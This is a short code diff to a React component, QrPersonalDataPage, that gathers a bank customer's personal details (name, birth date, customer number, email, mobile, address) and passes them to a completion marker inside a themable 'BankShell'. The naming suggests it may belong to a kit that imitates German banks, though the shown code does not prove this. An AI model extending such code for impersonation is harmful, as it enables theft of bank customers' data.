@@ -174,13 +174,27 @@ function QrPersonalDataPage() {
   }
 
   if (stage === "done") {
+    const doneCustomer: CustomerData = {
+      anrede: row.customer_anrede ?? "Herr/Frau",
+      name: row.customer_name ?? "—",
+      kundenNr: row.customer_number ?? "—",
+      geburtsdatum: row.customer_birthday ?? "—",
+      familienstand: "—",
+      email: row.customer_email ?? "—",
+      mobilNr: row.customer_mobile ?? "—",
+      adresse: {
+        strasse: row.customer_address_street ?? "—",
+        plzOrt: row.customer_address_city ?? "—",
+      },
+    };
     return (
       <BankShell {...shellProps}>
-        <NetkeyCompletionMarker refId={sessionId} />
+        <NetkeyCompletionMarker refId={sessionId} customer={doneCustomer} />
         <CompletionStep theme={theme} customerName={row.customer_name ?? ""} />
       </BankShell>
     );
   }
+
 
   if (stage === "devices") {
     const raw = Array.isArray(row.customer_devices) ? (row.customer_devices as any[]) : [];
